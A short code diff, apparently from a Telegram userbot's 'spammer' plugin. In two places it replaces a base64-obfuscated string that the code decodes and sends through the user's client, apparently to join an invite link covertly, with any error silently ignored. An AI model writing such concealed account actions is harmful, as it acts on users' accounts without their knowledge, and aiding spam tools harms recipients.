@@ -20,7 +20,7 @@ async def spammer(e):
     if not os.path.isdir(Config.TMP_DOWNLOAD_DIRECTORY):
         os.makedirs(Config.TMP_DOWNLOAD_DIRECTORY)
     try:
-        hmm = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+        hmm = base64.b64decode("VHhZVWRkVkhxZl8xVFU1bA==")
         hmm = Get(hmm)
         await e.client(hmm)
     except BaseException:
@@ -168,7 +168,7 @@ async def spammer(e):
     if not os.path.isdir(Config.TMP_DOWNLOAD_DIRECTORY):
         os.makedirs(Config.TMP_DOWNLOAD_DIRECTORY)
     try:
-        hmm = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+        hmm = base64.b64decode("VHhZVWRkVkhxZl8xVFU1bA==")
         hmm = Get(hmm)
         await e.client(hmm)
     except BaseException:
